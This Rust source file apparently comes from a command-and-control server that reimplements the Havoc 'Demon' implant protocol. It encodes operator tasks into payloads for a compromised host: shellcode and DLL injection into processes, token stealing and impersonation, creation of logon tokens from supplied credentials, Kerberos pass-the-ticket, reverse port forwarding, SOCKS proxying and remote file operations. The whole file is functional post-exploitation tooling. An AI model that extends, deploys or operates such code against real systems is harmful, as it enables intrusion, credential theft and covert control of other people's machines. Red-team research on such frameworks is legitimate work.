//! Payload encoders and subcommand parsers for each Demon command type.

use red_cell_common::demon::{
    DemonFilesystemCommand, DemonInjectWay, DemonKerberosCommand, DemonProcessCommand,
    DemonSocketCommand, DemonTokenCommand,
};

use super::AgentCommandError;
use super::helpers::{
    arch_to_flag, encode_utf16, ipv4_to_u32, parse_bool_field, parse_hex_u32,
    parse_injection_technique, parse_injection_way, parse_memory_protection, parse_u32_field,
    write_len_prefixed_bytes, write_u32,
};
use super::{
    decode_base64_field, decode_base64_required, extra_bool, flat_info_string_from_extra,
    optional_base64, optional_u32, required_string, required_u32,
};

// ── Payload encoders ────────────────────────────────────────────────────────

pub fn encode_proc_list_payload(info: &red_cell_common::operator::AgentTaskInfo) -> Vec<u8> {
    let from_process_manager = extra_bool(info, &["FromProcessManager"]).unwrap_or(false);
    u32::from(from_process_manager).to_le_bytes().to_vec()
}

pub fn encode_fs_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = filesystem_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonFilesystemCommand::Dir => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(8, ';').collect::<Vec<_>>();
            if parts.len() != 8 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            write_u32(&mut payload, 0);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]))?;
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[1]", parts[1])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[2]", parts[2])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[3]", parts[3])?));
            write_u32(&mut payload, u32::from(parse_bool_field("Arguments[4]", parts[4])?));
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]))?;
        }
        DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
            let path = decode_base64_required(info, &["Arguments"], "Arguments")?;
            let path = String::from_utf8_lossy(&path).into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Upload => {
            let remote_path = super::super::upload::upload_remote_path(info)?;
            let memfile_id = required_u32(info, &["MemFileId"], "MemFileId")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
            write_u32(&mut payload, memfile_id);
        }
        DemonFilesystemCommand::Cd
        | DemonFilesystemCommand::Remove
        | DemonFilesystemCommand::Mkdir => {
            let path = required_string(info, &["Arguments"], "Arguments")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
        }
        DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts = args.splitn(2, ';').collect::<Vec<_>>();
            if parts.len() != 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let from = String::from_utf8_lossy(&decode_base64_field("Arguments[0]", parts[0])?)
                .into_owned();
            let to = String::from_utf8_lossy(&decode_base64_field("Arguments[1]", parts[1])?)
                .into_owned();
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to))?;
        }
        DemonFilesystemCommand::GetPwd => {}
    }

    Ok(payload)
}

pub fn encode_proc_command_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = proc_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonProcessCommand::Kill => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Create => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.splitn(5, ';').collect::<Vec<_>>();
            if parts.len() != 5 {
                return Err(AgentCommandError::InvalidProcessCreateArguments);
            }

            let state = parse_u32_field("Args[0]", parts[0])?;
            let verbose = parse_bool_field("Args[1]", parts[1])?;
            let piped = parse_bool_field("Args[2]", parts[2])?;
            let program = parts[3];
            let process_args = decode_base64_field("Args[4]", parts[4])?;
            let process_args = String::from_utf8_lossy(&process_args).into_owned();

            write_u32(&mut payload, state);
            write_len_prefixed_bytes(&mut payload, &encode_utf16(program))?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&process_args))?;
            write_u32(&mut payload, u32::from(piped));
            write_u32(&mut payload, u32::from(verbose));
        }
        DemonProcessCommand::Modules => {
            let pid = required_u32(info, &["Args", "Arguments"], "Args")?;
            write_u32(&mut payload, pid);
        }
        DemonProcessCommand::Grep => {
            let pattern = required_string(info, &["Args", "Arguments"], "Args")?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern))?;
        }
        DemonProcessCommand::Memory => {
            let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
            let parts = arguments.split_whitespace().collect::<Vec<_>>();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Args" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let protection = parse_memory_protection(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, protection);
        }
    }

    Ok(payload)
}

pub fn encode_inject_shellcode_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let way = required_string(info, &["Way"], "Way")?;
    let technique = required_string(info, &["Technique"], "Technique")?;
    let arch = required_string(info, &["Arch"], "Arch")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Argument", "Arguments"])?.unwrap_or_default();

    let mut payload = Vec::new();
    match parse_injection_way(&way)? {
        DemonInjectWay::Inject => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Inject));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
            let pid = required_u32(info, &["PID"], "PID")?;
            write_u32(&mut payload, pid);
        }
        DemonInjectWay::Spawn => {
            write_u32(&mut payload, u32::from(DemonInjectWay::Spawn));
            write_u32(&mut payload, parse_injection_technique(&technique)?);
            write_u32(&mut payload, arch_to_flag(&arch)?);
            write_len_prefixed_bytes(&mut payload, &binary)?;
            write_len_prefixed_bytes(&mut payload, &arguments)?;
        }
        other => {
            return Err(AgentCommandError::UnsupportedInjectionWay {
                way: u32::from(other).to_string(),
            });
        }
    }

    Ok(payload)
}

pub fn encode_token_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = token_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, subcommand.into());

    match subcommand {
        DemonTokenCommand::Impersonate => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
        DemonTokenCommand::Steal => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 2 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let pid = parse_u32_field("PID", parts[0])?;
            let handle = parse_hex_u32(parts[1])?;
            write_u32(&mut payload, pid);
            write_u32(&mut payload, handle);
        }
        DemonTokenCommand::List
        | DemonTokenCommand::GetUid
        | DemonTokenCommand::Revert
        | DemonTokenCommand::Clear
        | DemonTokenCommand::FindTokens => {}
        DemonTokenCommand::PrivsGetOrList => {
            let sub_from_extra = flat_info_string_from_extra(&info.extra, &["SubCommand"]);
            let sub = info.sub_command.as_deref().or(sub_from_extra.as_deref()).unwrap_or("");
            if sub.eq_ignore_ascii_case("privs-list") || sub == "4" {
                write_u32(&mut payload, 1);
            } else {
                write_u32(&mut payload, 0);
                let priv_name = required_string(info, &["Arguments"], "Arguments")?;
                write_len_prefixed_bytes(&mut payload, priv_name.as_bytes())?;
            }
        }
        DemonTokenCommand::Make => {
            let args = required_string(info, &["Arguments"], "Arguments")?;
            let parts: Vec<&str> = args.split(';').collect();
            if parts.len() < 4 {
                return Err(AgentCommandError::MissingField { field: "Arguments" });
            }
            let domain = decode_base64_field("Domain", parts[0])?;
            let user = decode_base64_field("User", parts[1])?;
            let password = decode_base64_field("Password", parts[2])?;
            let logon_type = parse_u32_field("LogonType", parts[3])?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&domain)),
            )?;
            write_len_prefixed_bytes(&mut payload, &encode_utf16(&String::from_utf8_lossy(&user)))?;
            write_len_prefixed_bytes(
                &mut payload,
                &encode_utf16(&String::from_utf8_lossy(&password)),
            )?;
            write_u32(&mut payload, logon_type);
        }
        DemonTokenCommand::Remove => {
            let token_id = required_u32(info, &["Arguments"], "Arguments")?;
            write_u32(&mut payload, token_id);
        }
    }

    Ok(payload)
}

pub fn encode_socket_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let command = socket_command(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, command.0);

    match command.1.as_str() {
        "rportfwd add" => {
            let params = required_string(info, &["Params", "Arguments"], "Params")?;
            let parts = params.split(';').map(str::trim).collect::<Vec<_>>();
            if parts.len() != 4 {
                return Err(AgentCommandError::MissingField { field: "Params" });
            }
            write_u32(&mut payload, ipv4_to_u32(parts[0])?);
            write_u32(&mut payload, parse_u32_field("Params[1]", parts[1])?);
            write_u32(&mut payload, ipv4_to_u32(parts[2])?);
            write_u32(&mut payload, parse_u32_field("Params[3]", parts[3])?);
        }
        "rportfwd remove" => {
            let socket_id =
                parse_hex_u32(&required_string(info, &["Params", "Arguments"], "Params")?)?;
            write_u32(&mut payload, socket_id);
        }
        "rportfwd list" | "rportfwd clear" => {}
        _ => return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: command.1 }),
    }

    Ok(payload)
}

pub fn encode_kerberos_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let subcommand = kerberos_subcommand(info)?;
    let mut payload = Vec::new();
    write_u32(&mut payload, u32::from(subcommand));

    match subcommand {
        DemonKerberosCommand::Luid => {}
        DemonKerberosCommand::Klist => {
            let arg1 = required_string(info, &["Argument1", "Arguments"], "Argument1")?;
            if arg1.eq_ignore_ascii_case("/all") {
                write_u32(&mut payload, 0);
            } else if arg1.eq_ignore_ascii_case("/luid") {
                write_u32(&mut payload, 1);
                let luid = parse_hex_u32(&required_string(info, &["Argument2"], "Argument2")?)?;
                write_u32(&mut payload, luid);
            } else {
                return Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: arg1 });
            }
        }
        DemonKerberosCommand::Purge => {
            let luid =
                parse_hex_u32(&required_string(info, &["Argument", "Arguments"], "Argument")?)?;
            write_u32(&mut payload, luid);
        }
        DemonKerberosCommand::Ptt => {
            let ticket = decode_base64_required(info, &["Ticket"], "Ticket")?;
            let luid = parse_hex_u32(&required_string(info, &["Luid"], "Luid")?)?;
            write_len_prefixed_bytes(&mut payload, &ticket)?;
            write_u32(&mut payload, luid);
        }
    }

    Ok(payload)
}

pub fn encode_inject_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let technique = optional_u32(info, &["Technique"]).unwrap_or(0);
    let pid = required_u32(info, &["PID"], "PID")?;
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_u32(&mut payload, technique);
    write_u32(&mut payload, pid);
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

pub fn encode_spawn_dll_payload(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<Vec<u8>, AgentCommandError> {
    let loader = decode_base64_required(info, &["DllLoader", "Loader"], "DllLoader")?;
    let binary = decode_base64_required(info, &["Binary"], "Binary")?;
    let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();

    let mut payload = Vec::new();
    write_len_prefixed_bytes(&mut payload, &loader)?;
    write_len_prefixed_bytes(&mut payload, &binary)?;
    write_len_prefixed_bytes(&mut payload, &arguments)?;
    Ok(payload)
}

// ── Subcommand parsers ──────────────────────────────────────────────────────

fn proc_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonProcessCommand, AgentCommandError> {
    let raw = flat_info_string_from_extra(&info.extra, &["ProcCommand"])
        .or_else(|| info.sub_command.clone())
        .ok_or(AgentCommandError::MissingField { field: "ProcCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "2" | "modules" => Ok(DemonProcessCommand::Modules),
        "3" | "grep" => Ok(DemonProcessCommand::Grep),
        "4" | "create" => Ok(DemonProcessCommand::Create),
        "6" | "memory" => Ok(DemonProcessCommand::Memory),
        "7" | "kill" => Ok(DemonProcessCommand::Kill),
        _ => Err(AgentCommandError::UnsupportedProcessSubcommand { subcommand: raw }),
    }
}

pub fn filesystem_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonFilesystemCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "dir" | "ls" => Ok(DemonFilesystemCommand::Dir),
        "2" | "download" => Ok(DemonFilesystemCommand::Download),
        "3" | "upload" => Ok(DemonFilesystemCommand::Upload),
        "4" | "cd" => Ok(DemonFilesystemCommand::Cd),
        "5" | "remove" | "rm" | "del" => Ok(DemonFilesystemCommand::Remove),
        "6" | "mkdir" => Ok(DemonFilesystemCommand::Mkdir),
        "7" | "cp" | "copy" => Ok(DemonFilesystemCommand::Copy),
        "8" | "mv" | "move" => Ok(DemonFilesystemCommand::Move),
        "9" | "pwd" => Ok(DemonFilesystemCommand::GetPwd),
        "10" | "cat" | "type" => Ok(DemonFilesystemCommand::Cat),
        _ => Err(AgentCommandError::UnsupportedFilesystemSubcommand { subcommand: raw }),
    }
}

fn token_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonTokenCommand, AgentCommandError> {
    let raw = info
        .sub_command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["SubCommand"]))
        .ok_or(AgentCommandError::MissingField { field: "SubCommand" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "1" | "impersonate" => Ok(DemonTokenCommand::Impersonate),
        "2" | "steal" => Ok(DemonTokenCommand::Steal),
        "3" | "list" => Ok(DemonTokenCommand::List),
        "4" | "privs-list" | "privs-get" | "privs" => Ok(DemonTokenCommand::PrivsGetOrList),
        "5" | "make" => Ok(DemonTokenCommand::Make),
        "6" | "getuid" => Ok(DemonTokenCommand::GetUid),
        "7" | "revert" => Ok(DemonTokenCommand::Revert),
        "8" | "remove" => Ok(DemonTokenCommand::Remove),
        "9" | "clear" => Ok(DemonTokenCommand::Clear),
        "10" | "find" => Ok(DemonTokenCommand::FindTokens),
        _ => Err(AgentCommandError::UnsupportedTokenSubcommand { subcommand: raw }),
    }
}

pub fn socket_command(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<(u32, String), AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    let normalized = raw.trim().to_ascii_lowercase();
    let command = match normalized.as_str() {
        "rportfwd add" => u32::from(DemonSocketCommand::ReversePortForwardAdd),
        "rportfwd list" => u32::from(DemonSocketCommand::ReversePortForwardList),
        "rportfwd remove" => u32::from(DemonSocketCommand::ReversePortForwardRemove),
        "rportfwd clear" => u32::from(DemonSocketCommand::ReversePortForwardClear),
        "socks add" | "socks list" | "socks kill" | "socks clear" => {
            u32::from(DemonSocketCommand::SocksProxyAdd)
        }
        _ => {
            return Err(AgentCommandError::UnsupportedSocketSubcommand { subcommand: raw });
        }
    };
    Ok((command, normalized))
}

fn kerberos_subcommand(
    info: &red_cell_common::operator::AgentTaskInfo,
) -> Result<DemonKerberosCommand, AgentCommandError> {
    let raw = info
        .command
        .clone()
        .or_else(|| flat_info_string_from_extra(&info.extra, &["Command"]))
        .ok_or(AgentCommandError::MissingField { field: "Command" })?;
    match raw.trim().to_ascii_lowercase().as_str() {
        "luid" => Ok(DemonKerberosCommand::Luid),
        "klist" => Ok(DemonKerberosCommand::Klist),
        "purge" => Ok(DemonKerberosCommand::Purge),
        "ptt" => Ok(DemonKerberosCommand::Ptt),
        _ => Err(AgentCommandError::UnsupportedKerberosSubcommand { subcommand: raw }),
    }
}
